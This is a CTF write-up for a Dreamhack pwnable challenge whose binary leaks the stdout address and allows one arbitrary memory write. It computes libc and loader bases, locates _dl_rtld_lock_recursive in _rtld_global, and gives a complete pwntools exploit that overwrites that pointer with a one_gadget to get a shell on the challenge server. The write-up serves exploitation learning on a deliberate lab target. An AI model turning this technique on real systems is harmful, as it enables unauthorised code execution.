---
title: "Write up"
date: 2025-11-18 01:41:18 +0900
categories: [CTF, Dreamhack, Pwnable, Write up]
tags: []
---

# Write up

Source code of binary is given

```
void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value; 

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}
```

# Primitives

In function **main**, there are arbitary address write primitve and stdout address leak which can lead to libc base and ld base leak. <br>

00000000003c5620 _IO_2_1_stdout_@@GLIBC_2.2.5 => libc base. => vmmap => loader base

For docker build, we can use script below. Point is **--pid=host**. 
```
sudo docker build -t test .
sudo docker run --pid=host -d -p 10001:10001 test
```

So, we got loader base. 

```
gef> p/x 0x00007f540eca8000 - 0x00007f540e8de000
$1 = 0x3ca000
```

Now, we have to get the symbol of libc and loader. Use **readelf** <br>
Found version -> libc6-dbg_2.23-0ubuntu11.3_amd64.deb

```
dpkg -x libc6-dbg_2.23-0ubuntu11.3_amd64.deb ./ 

user@user:~/CTF$ readelf -a usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so | grep _rtld_global
   523: 0000000000226040  3968 OBJECT  GLOBAL DEFAULT   21 _rtld_global  
   541: 0000000000225ca0   376 OBJECT  GLOBAL DEFAULT   17 _rtld_global_ro 

gef> p &_rtld_global._dl_rtld_lock_recursive 
$3 = (void (**)(void *)) 0x226f48 <_rtld_local+3848>

user@user:~/CTF$ one_gadget libc-2.23.so
0x4527a execve("/bin/sh", rsp+0x30, environ) 
constraints:  
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv 
 
0xf03a4 execve("/bin/sh", rsp+0x50, environ) 
constraints:  
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv 
  
0xf1247 execve("/bin/sh", rsp+0x70, environ)  
constraints:   
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv      
```

So, if we can overwrite _dl_rtld_lock_recursive function pointer with one gadget, we can get shell

# Exploit

```
from pwn import *

context.log_level = 'debug'

p = remote('host1.dreamhack.games', 17330)

p.recvuntil(b'stdout: ')

libc_base = int(p.recvline()[:-1],16) - 0x3c5620

loader_base = libc_base + 0x3ca000

dl = loader_base + 0x226040 + 3848

og = 0xf1247

p.recvuntil(b'addr: ')
p.sendline(str(dl))
p.recvuntil(b'value: ')
p.sendline(str(libc_base + og))

p.interactive()

```

